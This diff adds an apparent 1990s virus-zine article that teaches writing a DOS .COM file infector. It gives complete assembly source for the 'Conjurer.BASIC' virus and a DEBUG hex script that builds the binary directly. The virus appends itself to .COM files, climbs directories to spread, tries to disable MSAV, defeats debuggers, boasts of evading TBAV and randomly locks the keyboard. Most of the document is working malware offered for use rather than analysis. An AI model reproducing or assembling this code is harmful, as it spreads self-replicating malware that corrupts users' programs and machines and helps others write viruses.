@@ -1,0 +1,242 @@
+------------------------------Immortal Virus Magazine-------------------------
+-----------------------------------Issue 95.1----------------------------------
+--------------------------The basics of a .COM infector------------------------
+
+We'll begin with the search .COM routine of a virus.
+ The best way is to to use function 4Eh & 4Fh.
+- Function 4Eh  Find First file
+   Inputs:      It needs a DTA set.
+                DS:DX = Filespec
+                BX    = Attribute
+   Outputs:     DTA + 1Eh = Filename + 0 byte
+- Function 4Fh  Find next file
+   Inputs:      By function 4Eh or 4Fh pre-initiated DTA
+   Outputs:     DTA + 1Eh = Filename + 0 byte
+
+Now, the implementation technique.
+ I think the best way is to make a four byte jump table and an original bytes
+  table, the jump table exists out of an 0E9h byte, two 00h bytes and an
+  identification byte (eg. DB 0E9h,00h,00h,'C'), in the original bytes
+  table the first four bytes will be stored. First read the original bytes,
+  store then in the org. bytes table, append then virus at the end, calculate
+  the jump offset, place them in the jump table, write the jump table at the
+  beginning of the victim file.
+
+- Function 3Dh  Open file
+   Inputs:      AL    = Mode ( 02h = Random access )
+                DS:DX = Filename ( eg. DTA + 1Eh )
+   Outputs:     AX    = File-handle ( eXCHanGe to BX for other functions )
+
+- Function 3Fh  Read from file
+   Inputs:      CX    = Bytes to read
+                DS:DX = Destination of read
+                BX    = File-handle
+
+- Function 42h  Set file-pointer
+                AL    = Mode ( 00h = From SOF / 02h = From EOF)
+                DX:CX = Offset in file (0:0 for SOF / EOF)
+
+- Function 40h  Write into file
+                CX    = Bytes to write
+                DS:DX = Offset of data to write
+                BX    = File-handle
+
+- Function 3Eh  Close file
+                BX    = File-handle
+
+ Now here follows the assembly source and a debug script of the Conjurer Basic
+  virus, created by [Hacking Hell] & [Cyborg], it's 270 bytes large and a good
+  example virus for the techniques you may have learned...
+
+-------------------------------------<CUT>-------------------------------------
+; Conjurer.BASIC virus...
+
+%OUT    CoNJuReR.BASIC virus by [Hacking Hell] & [Cyborg]
+%OUT    Appending non-descructive non-resident non-flagged virus.
+%OUT   Features:
+%OUT    - Anti trace meganism
+%OUT    - 99% TBAV proof (almost no flags)
+%OUT    - Traversal (DotDot technique)
+%OUT    - Little message
+%OUT    - 13% chance for a keyboard lock
+
+.model  tiny
+.code
+
+	ORG     100h                    ;COM file remember?!?
+
+dummy:  db      0e9h,02h,00h            ;The dummy host: jump to START
+	db      'C'                     ;Already infected marker
+	ret                             ;Exit from dummy
+
+start:  push    cx                      ;Some junk to fool TBAV
+	pop     bx
+
+	mov     ax,0fa01h               ;Let's take down MSAV!!!
+	mov     dx,05945h
+	int     16h
+
+	call    getdlt                  ;Nice way to get delta offset!
+realst:
+getdlt: pop     bp
+	sub     bp, offset getdlt
+	call    encdec
+	jmp     codest
+
+	nop                             ;TBAV eats '#'
+
+codest: lea     si,[orgbts+bp]          ;Restore first 4 bytes
+	mov     di,0100h
+	movsw
+	movsw
+
+	push    cs                      ;DS <==> CS
+	pop     ds
+
+	lea     dx,[eov+bp]             ;Set DTA address
+	mov     ah,1ah
+	int     21h
+
+	mov     ax,3501h                ;Crash INT 1
+	sub     ah,10h
+	mov     bx,0000h
+	mov     es,bx
+	int     21h
+
+	mov     al,03h                  ;Crash INT 3
+	int     21h
+
+	mov     ah,2ch                  ;13% chance to lock keyboard!
+	int     21h
+	cmp     dl, 0dh
+	jg      nolock
+
+lockkb: mov     al,82h                  ;Keyboard lock!
+	out     21h,al
+
+nolock: mov     ah,2ch                  ;50% chance to print message!
+	int     21h
+	cmp     dl,32h
+	jl      spread
+
+	mov     ah,09h                  ;Bingo! print message!
+	lea     dx, [bp+offset welcome]
+	int     21h
+	mov     ah,00h                  ;Wait for a key!
+	int     16h
+	jmp     spread
+
+welcome db 'CoNJuReR.BSC!',07h,0ah,0dh,'$';Ever seen a DB in the middle of a file?
+
+spread: mov     byte ptr [infcnt+bp],0
+spraed: mov     ah,4eh                  ;Findfirst
+	lea     dx,[fspec+bp]           ;Filespec=*.COM
+
+fnext:  cmp     byte ptr [infcnt+bp],5
+	je      re_dta
+
+	int     21h
+	jc      dotdot                  ;No files found
+	call    infect
+
+nextf:  mov     ah,4fh                  ;Find next file
+	jmp     fnext
+
+dotdot: lea     dx,[offset dotspec+bp]
+	mov     ax,3b00h
+	int     21h
+	jnc     spraed
+
+re_dta: mov     ah,1ah                  ;Reset DTA
+	mov     dx,0080h
+	int     21h
+
+	mov     di,0100h                ;Return control to original file!
+	push    di
+	ret
+
+
+fspec   db      '*.com',0
+infcnt  db      0
+dotspec db      '..',0
+jmptbl  db      0e9h,02h,00h,'C'
+orgbts: db      90h,90h,90h,90h
+eoe:
+infect: lea     dx,[eov+1eh+bp]         ;Open file
+	mov     ax,3d02h
+	int     21h
+
+	jc      nextf                   ;Error opening file, next!
+
+	xchg    bx,ax
+
+	mov     cx,0004h                ;Read first 4 bytes for check
+	mov     ah,3fh                  ; if already infected!
+	lea     dx,[orgbts+bp]
+	int     21h
+
+	cmp     byte ptr [orgbts+bp+3],'C' ;Already infected
+	jz      shutit
+
+	mov     ax,4202h                ;Goto eof
+	sub     cx,cx                   ;2 byte version of mov cx,0!!
+	cwd                             ;1 byte version of mov dx,0!!
+	int     21h
+
+	sub     ax,0003h                ;Use our jmp table
+	mov     word ptr [bp+jmptbl+1],ax
+
+	mov     ah,40h                  ;Implend our viral code into victim
+	mov     cx,eov-start
+	lea     dx,[bp+start]
+	int     21h
+
+	mov     ax,4200h                ;Goto SOF
+	sub     cx,cx
+	cwd
+	int     21h
+
+	mov     ah,40h                  ;Write first four bytes over
+	mov     cx,0004h                ; the original
+	lea     dx,[bp+jmptbl]
+	int     21h
+
+	inc     byte ptr [infcnt+bp]
+
+shutit: mov     ah,3eh                  ;Close victim
+	int     21h
+	ret
+encdec: ret                             ;No encryption support yet...
+eov:
+end     dummy
+-------------------------------------<CUT>------------------------------------
+Now the DEBUG script for all of you who don't have an assembler!
+-------------------------------------<CUT>------------------------------------
+N CONJURER.COM
+E 0100 E9 02 00 43 C3 51 5B B8 01 FA BA 45 59 CD 16 E8
+E 0110 00 00 5D 81 ED 12 01 E8 F8 00 EB 02 90 90 8D B6
+E 0120 BA 01 BF 00 01 A5 A5 0E 1F 8D 96 13 02 B4 1A CD
+E 0130 21 B8 01 35 80 EC 10 BB 00 00 8E C3 CD 21 B0 03
+E 0140 CD 21 B4 2C CD 21 80 FA 0D 7F 04 B0 82 E6 21 B4
+E 0150 2C CD 21 80 FA 32 7C 20 B4 09 8D 96 67 01 CD 21
+E 0160 B4 00 CD 16 EB 12 90 43 6F 4E 4A 75 52 65 52 2E
+E 0170 42 53 43 21 07 0A 0D 24 C6 86 B2 01 00 B4 4E 8D
+E 0180 96 AC 01 80 BE B2 01 05 74 16 CD 21 72 07 E8 2D
+E 0190 00 B4 4F EB EE 8D 96 B3 01 B8 00 3B CD 21 73 DD
+E 01A0 B4 1A BA 80 00 CD 21 BF 00 01 57 C3 2A 2E 63 6F
+E 01B0 6D 00 00 2E 2E 00 E9 02 00 43 90 90 90 90 8D 96
+E 01C0 31 02 B8 02 3D CD 21 72 C8 93 B9 04 00 B4 3F 8D
+E 01D0 96 BA 01 CD 21 80 BE BD 01 43 74 31 B8 02 42 2B
+E 01E0 C9 99 CD 21 2D 03 00 89 86 B7 01 B4 40 B9 0E 01
+E 01F0 8D 96 05 01 CD 21 B8 00 42 2B C9 99 CD 21 B4 40
+E 0200 B9 04 00 8D 96 B6 01 CD 21 FE 86 B2 01 B4 3E CD
+E 0210 21 C3 C3
+
+RCX
+113
+W
+Q
+-------------------------------------<CUT>------------------------------------
+------------------------------------------------------------------------------
+
+By: [Hacking Hell]
